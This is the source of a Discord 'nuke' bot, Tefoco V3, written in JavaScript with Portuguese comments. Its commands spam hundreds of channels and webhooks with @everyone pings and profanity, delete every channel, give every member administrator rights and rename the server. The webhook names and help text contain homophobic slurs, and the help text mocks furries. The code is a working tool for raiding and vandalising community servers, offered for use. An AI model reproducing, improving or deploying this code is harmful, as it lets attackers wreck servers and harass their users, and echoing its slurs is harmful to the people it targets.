//eu taco tudo num arquivo só memo e daí
//fodase o module.exports pra comando 😎

const Discord = require("discord.js");
const client = new Discord.Client({ ws: { properties: { $browser: "Discord iOS" }} }); //status mobile
const vivo = require(`./server`)
const prefix = '$';

let i = 0;

client.on("ready", () => { 
    console.clear()
    console.log(`ready for destroy ppl's days`)
    console.log(`Tefoco V3`)
    var interval = setInterval (function () {
      client.user.setActivity(`Prefix: $ [${status[Math.floor(Math.random() * status.length)]}]`)
    }, 120000); //troca de status a cada 5 min
});

client.on("message", (message) => {
    if(message.author.bot) return;
    const args = message.content.slice(prefix.length).trim().split(/ +/g);
    const comando = args.shift().toLowerCase();
    switch(comando) {
        case "yeet":
            message.delete();
            let i;
            message.guild.setIcon(`./image.png`)
            if(!args[0]){ 
                message.guild.setName('haha admin go grr')
                for(i = 0; i < 251; i++){
                  if(message.guild.channels.cache.size == "500") break;
                    message.guild.channels.create(`haha admin go grr`, {type: `text`}).then(m =>{
                        m.createWebhook("get raided faggots").then(w => {
                          const case1hook = new Discord.WebhookClient(w.id, w.token)
                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
                        })
                    })
                    message.guild.channels.create(`haha admin go grr`, {type: `voice`})
                 }
            } else {
                message.guild.setName(`${args.slice(0).join(' ')}`)
                for(i = 0; i < 251; i++){
                    if(message.guild.channels.cache.size == "500") break;
                    message.guild.channels.create(`${args.slice(0).join(' ')}`, {type: `text`}).then(m =>{
                        m.createWebhook("get raided faggots").then(w => {
                          const case2hook = new Discord.WebhookClient(w.id, w.token)
                          case2hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
                        })
                    })
                    message.guild.channels.create(`${args.slice(0).join(' ')}`, {type: `voice`})
                }
            }
        break;
        case "del":
            message.delete();
            message.guild.setIcon(`./image.png`)
            message.guild.channels.cache.forEach(m =>{if(m.deletable) m.delete()});
            message.guild.channels.create(`\uA672`, {type: `text`})
        break;
        case "admall":
            message.delete();
            message.guild.roles.everyone.setPermissions(['ADMINISTRATOR']);
        break;
        case "servername":
            message.delete();
            if(!args[0]) return;
            message.guild.setName(`${args.slice(0).join(' ')}`)
        break;
        case "help":
            message.delete();
            const help = [`Tefoco V3\n`,
            "prefix: $",
            "$yeet (optional name for the things)- makes a lot of text channels and vcs, and roles, changes the server's name and pings everyone on the new channels",
            "$del - yeets all the channels and only leaves one",
            "$admall -self explanatory",
            "$servername (new server name) - self explanatory",
            `$help - bruhhh\n`,
            "Bot by paradino, making gachafags and furries lifes worse"]
            message.author.send(`${help.slice(0).join(`\n`)}`)
        break;
    }
});

vivo()

client.login(process.env.token);

//para de olhar aqui poha
//- mene paradino
